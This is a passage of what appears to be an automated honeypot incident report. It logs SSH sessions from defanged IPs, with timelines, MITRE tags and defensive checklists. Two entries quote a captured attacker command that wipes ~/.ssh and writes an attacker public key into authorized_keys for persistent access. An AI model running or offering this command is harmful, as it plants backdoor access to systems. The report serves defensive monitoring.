|---|---|
| `2026-07-14 17:24:34` | `cowrie.session.connect` |
| `2026-07-14 17:24:35` | `cowrie.client.version` |
| `2026-07-14 17:24:35` | `cowrie.client.kex` |
| `2026-07-14 17:24:37` | `cowrie.login.success` |
| `2026-07-14 17:24:38` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.92.61[.]242` to AbuseIPDB if not already reported
- [ ] Block `222.92.61[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c40aaf30bbe7

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]164` |
| **First Seen** | 2026-07-14 17:24 |
| **Last Seen** | 2026-07-14 17:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:24:39` | `cowrie.session.connect` |
| `2026-07-14 17:24:40` | `cowrie.client.version` |
| `2026-07-14 17:24:40` | `cowrie.client.kex` |
| `2026-07-14 17:24:42` | `cowrie.login.success` |
| `2026-07-14 17:24:42` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:24:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]164` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f180cc3b552

| Field | Detail |
|---|---|
| **Source IP** | `39.164.91[.]67` |
| **First Seen** | 2026-07-14 17:24 |
| **Last Seen** | 2026-07-14 17:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:24:43` | `cowrie.session.connect` |
| `2026-07-14 17:24:44` | `cowrie.client.version` |
| `2026-07-14 17:24:44` | `cowrie.client.kex` |
| `2026-07-14 17:24:46` | `cowrie.login.success` |
| `2026-07-14 17:24:47` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:24:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.91[.]67` to AbuseIPDB if not already reported
- [ ] Block `39.164.91[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87dcdb40e80f

| Field | Detail |
|---|---|
| **Source IP** | `61.12.86[.]90` |
| **First Seen** | 2026-07-14 17:27 |
| **Last Seen** | 2026-07-14 17:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:27:07` | `cowrie.session.connect` |
| `2026-07-14 17:27:07` | `cowrie.client.version` |
| `2026-07-14 17:27:07` | `cowrie.client.kex` |
| `2026-07-14 17:27:09` | `cowrie.login.success` |
| `2026-07-14 17:27:10` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:27:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.86[.]90` to AbuseIPDB if not already reported
- [ ] Block `61.12.86[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66c2c60e34a0

| Field | Detail |
|---|---|
| **Source IP** | `156.238.86[.]2` |
| **First Seen** | 2026-07-14 17:27 |
| **Last Seen** | 2026-07-14 17:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:27:17` | `cowrie.session.connect` |
| `2026-07-14 17:27:19` | `cowrie.client.version` |
| `2026-07-14 17:27:19` | `cowrie.client.kex` |
| `2026-07-14 17:27:24` | `cowrie.login.success` |
| `2026-07-14 17:27:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.238.86[.]2` to AbuseIPDB if not already reported
- [ ] Block `156.238.86[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03da855edb28

| Field | Detail |
|---|---|
| **Source IP** | `122.186.249[.]6` |
| **First Seen** | 2026-07-14 17:28 |
| **Last Seen** | 2026-07-14 17:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:28:03` | `cowrie.session.connect` |
| `2026-07-14 17:28:04` | `cowrie.client.version` |
| `2026-07-14 17:28:04` | `cowrie.client.kex` |
| `2026-07-14 17:28:06` | `cowrie.login.success` |
| `2026-07-14 17:28:07` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.186.249[.]6` to AbuseIPDB if not already reported
- [ ] Block `122.186.249[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d561430493d7

| Field | Detail |
|---|---|
| **Source IP** | `220.132.170[.]64` |
| **First Seen** | 2026-07-14 17:28 |
| **Last Seen** | 2026-07-14 17:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:28:12` | `cowrie.session.connect` |
| `2026-07-14 17:28:13` | `cowrie.client.version` |
| `2026-07-14 17:28:13` | `cowrie.client.kex` |
| `2026-07-14 17:28:15` | `cowrie.login.success` |
| `2026-07-14 17:28:16` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:28:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.132.170[.]64` to AbuseIPDB if not already reported
- [ ] Block `220.132.170[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5382ec56c99

| Field | Detail |
|---|---|
| **Source IP** | `113.158.205[.]225` |
| **First Seen** | 2026-07-14 17:28 |
| **Last Seen** | 2026-07-14 17:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:28:13` | `cowrie.session.connect` |
| `2026-07-14 17:28:14` | `cowrie.client.version` |
| `2026-07-14 17:28:14` | `cowrie.client.kex` |
| `2026-07-14 17:28:16` | `cowrie.login.success` |
| `2026-07-14 17:28:17` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.158.205[.]225` to AbuseIPDB if not already reported
- [ ] Block `113.158.205[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80dda4dac8eb

| Field | Detail |
|---|---|
| **Source IP** | `65.20.202[.]4` |
| **First Seen** | 2026-07-14 17:28 |
| **Last Seen** | 2026-07-14 17:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:28:22` | `cowrie.session.connect` |
| `2026-07-14 17:28:23` | `cowrie.client.version` |
| `2026-07-14 17:28:23` | `cowrie.client.kex` |
| `2026-07-14 17:28:24` | `cowrie.login.success` |
| `2026-07-14 17:28:24` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:28:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.202[.]4` to AbuseIPDB if not already reported
- [ ] Block `65.20.202[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c91f0d71cdcf

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-07-14 17:35 |
| **Last Seen** | 2026-07-14 17:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:35:16` | `cowrie.session.connect` |
| `2026-07-14 17:35:16` | `cowrie.client.version` |
| `2026-07-14 17:35:16` | `cowrie.client.kex` |
| `2026-07-14 17:35:17` | `cowrie.login.success` |
| `2026-07-14 17:35:18` | `cowrie.session.params` |
| `2026-07-14 17:35:18` | `cowrie.command.input` |
| `2026-07-14 17:35:18` | `cowrie.command.failed` |
| `2026-07-14 17:35:18` | `cowrie.log.closed` |
| `2026-07-14 17:35:19` | `cowrie.session.params` |
| `2026-07-14 17:35:19` | `cowrie.command.input` |
| `2026-07-14 17:35:19` | `cowrie.session.file_download` |
| `2026-07-14 17:35:19` | `cowrie.log.closed` |
| `2026-07-14 17:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8698791d45f

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-07-14 17:35 |
| **Last Seen** | 2026-07-14 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:35:20` | `cowrie.session.connect` |
| `2026-07-14 17:35:20` | `cowrie.client.version` |
| `2026-07-14 17:35:20` | `cowrie.client.kex` |
| `2026-07-14 17:35:21` | `cowrie.login.success` |
| `2026-07-14 17:35:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6817e932b64

| Field | Detail |
|---|---|
| **Source IP** | `103.20.122[.]54` |
| **First Seen** | 2026-07-14 17:35 |
| **Last Seen** | 2026-07-14 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:35:21` | `cowrie.session.connect` |
| `2026-07-14 17:35:21` | `cowrie.client.version` |
| `2026-07-14 17:35:22` | `cowrie.client.kex` |
| `2026-07-14 17:35:23` | `cowrie.login.success` |
| `2026-07-14 17:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.122[.]54` to AbuseIPDB if not already reported
- [ ] Block `103.20.122[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25cf1cf37490

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-14 17:37 |
| **Last Seen** | 2026-07-14 17:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:37:20` | `cowrie.session.connect` |
| `2026-07-14 17:37:20` | `cowrie.client.version` |
| `2026-07-14 17:37:20` | `cowrie.client.kex` |
| `2026-07-14 17:37:21` | `cowrie.login.success` |
| `2026-07-14 17:37:21` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:37:21` | `cowrie.direct-tcpip.data` |
| `2026-07-14 17:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c44478c8e09e

| Field | Detail |
|---|---|
| **Source IP** | `135.181.251[.]219` |
| **First Seen** | 2026-07-14 17:38 |
| **Last Seen** | 2026-07-14 17:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:38:36` | `cowrie.session.connect` |
| `2026-07-14 17:38:36` | `cowrie.client.version` |
| `2026-07-14 17:38:36` | `cowrie.client.kex` |
| `2026-07-14 17:38:37` | `cowrie.login.success` |
| `2026-07-14 17:38:37` | `cowrie.session.params` |
| `2026-07-14 17:38:37` | `cowrie.command.input` |
| `2026-07-14 17:38:37` | `cowrie.command.failed` |
| `2026-07-14 17:38:38` | `cowrie.log.closed` |
| `2026-07-14 17:38:38` | `cowrie.session.params` |
| `2026-07-14 17:38:38` | `cowrie.command.input` |
| `2026-07-14 17:38:39` | `cowrie.session.file_download` |
| `2026-07-14 17:38:39` | `cowrie.log.closed` |
| `2026-07-14 17:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.181.251[.]219` to AbuseIPDB if not already reported
- [ ] Block `135.181.251[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdc89950a807

| Field | Detail |
|---|---|
| **Source IP** | `135.181.251[.]219` |
| **First Seen** | 2026-07-14 17:38 |
| **Last Seen** | 2026-07-14 17:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:38:39` | `cowrie.session.connect` |
| `2026-07-14 17:38:39` | `cowrie.client.version` |
| `2026-07-14 17:38:39` | `cowrie.client.kex` |
| `2026-07-14 17:38:39` | `cowrie.login.success` |
| `2026-07-14 17:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.181.251[.]219` to AbuseIPDB if not already reported
- [ ] Block `135.181.251[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04b2de665cb2

| Field | Detail |
|---|---|
| **Source IP** | `135.181.251[.]219` |
| **First Seen** | 2026-07-14 17:38 |
| **Last Seen** | 2026-07-14 17:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:38:40` | `cowrie.session.connect` |
| `2026-07-14 17:38:40` | `cowrie.client.version` |
| `2026-07-14 17:38:40` | `cowrie.client.kex` |
| `2026-07-14 17:38:40` | `cowrie.login.success` |
| `2026-07-14 17:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.181.251[.]219` to AbuseIPDB if not already reported
- [ ] Block `135.181.251[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a88af30dc1d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-14 17:42 |
| **Last Seen** | 2026-07-14 17:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:42:45` | `cowrie.session.connect` |
| `2026-07-14 17:42:45` | `cowrie.client.version` |
| `2026-07-14 17:42:46` | `cowrie.client.kex` |
| `2026-07-14 17:42:46` | `cowrie.login.success` |
| `2026-07-14 17:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93fc19cd8d42

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-14 17:42 |
| **Last Seen** | 2026-07-14 17:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:42:46` | `cowrie.session.connect` |
| `2026-07-14 17:42:46` | `cowrie.client.version` |
| `2026-07-14 17:42:46` | `cowrie.client.kex` |
| `2026-07-14 17:42:46` | `cowrie.login.success` |
| `2026-07-14 17:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19c36b1aae51

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-14 17:42 |
| **Last Seen** | 2026-07-14 17:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:42:54` | `cowrie.session.connect` |
| `2026-07-14 17:42:54` | `cowrie.client.version` |
| `2026-07-14 17:42:54` | `cowrie.client.kex` |
| `2026-07-14 17:42:55` | `cowrie.login.success` |
| `2026-07-14 17:42:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c8cde348082

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-14 17:42 |
| **Last Seen** | 2026-07-14 17:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:42:55` | `cowrie.session.connect` |
| `2026-07-14 17:42:55` | `cowrie.client.version` |
| `2026-07-14 17:42:55` | `cowrie.client.kex` |
| `2026-07-14 17:42:56` | `cowrie.login.success` |
| `2026-07-14 17:42:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3bb972171bf

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-14 17:46 |
| **Last Seen** | 2026-07-14 17:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:46:46` | `cowrie.session.connect` |
| `2026-07-14 17:46:46` | `cowrie.client.version` |
| `2026-07-14 17:46:46` | `cowrie.client.kex` |
| `2026-07-14 17:46:46` | `cowrie.login.success` |
| `2026-07-14 17:46:47` | `cowrie.session.params` |
| `2026-07-14 17:46:47` | `cowrie.command.input` |
| `2026-07-14 17:46:47` | `cowrie.log.closed` |
| `2026-07-14 17:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67f069ee142e

| Field | Detail |
|---|---|
| **Source IP** | `60.173.105[.]206` |
| **First Seen** | 2026-07-14 17:48 |
| **Last Seen** | 2026-07-14 17:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:48:48` | `cowrie.session.connect` |
| `2026-07-14 17:48:49` | `cowrie.client.version` |
| `2026-07-14 17:48:49` | `cowrie.client.kex` |
| `2026-07-14 17:48:51` | `cowrie.login.success` |
| `2026-07-14 17:48:52` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.173.105[.]206` to AbuseIPDB if not already reported
- [ ] Block `60.173.105[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ba3f43bc0c1

| Field | Detail |
|---|---|
| **Source IP** | `14.1.64[.]22` |
| **First Seen** | 2026-07-14 17:48 |
| **Last Seen** | 2026-07-14 17:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:48:57` | `cowrie.session.connect` |
| `2026-07-14 17:48:58` | `cowrie.client.version` |
| `2026-07-14 17:48:58` | `cowrie.client.kex` |
| `2026-07-14 17:49:00` | `cowrie.login.success` |
| `2026-07-14 17:49:01` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:49:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.1.64[.]22` to AbuseIPDB if not already reported
- [ ] Block `14.1.64[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a633341ebf3

| Field | Detail |
|---|---|
| **Source IP** | `185.255.212[.]178` |
| **First Seen** | 2026-07-14 17:49 |
| **Last Seen** | 2026-07-14 17:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:49:43` | `cowrie.session.connect` |
| `2026-07-14 17:49:44` | `cowrie.client.version` |
| `2026-07-14 17:49:44` | `cowrie.client.kex` |
| `2026-07-14 17:49:45` | `cowrie.login.success` |
| `2026-07-14 17:49:46` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:49:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.255.212[.]178` to AbuseIPDB if not already reported
- [ ] Block `185.255.212[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b51046d9e716

| Field | Detail |
|---|---|
| **Source IP** | `218.29.196[.]162` |
| **First Seen** | 2026-07-14 17:49 |
| **Last Seen** | 2026-07-14 17:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:49:51` | `cowrie.session.connect` |
| `2026-07-14 17:49:52` | `cowrie.client.version` |
| `2026-07-14 17:49:52` | `cowrie.client.kex` |
| `2026-07-14 17:49:54` | `cowrie.login.success` |
| `2026-07-14 17:49:55` | `cowrie.direct-tcpip.request` |
| `2026-07-14 17:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.29.196[.]162` to AbuseIPDB if not already reported
- [ ] Block `218.29.196[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-429430bc34f2

| Field | Detail |
|---|---|
| **Source IP** | `196.0.34[.]106` |
| **First Seen** | 2026-07-14 17:50 |
| **Last Seen** | 2026-07-14 17:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 17:50:15` | `cowrie.session.connect` |
| `2026-07-14 17:50:16` | `cowrie.client.version` |
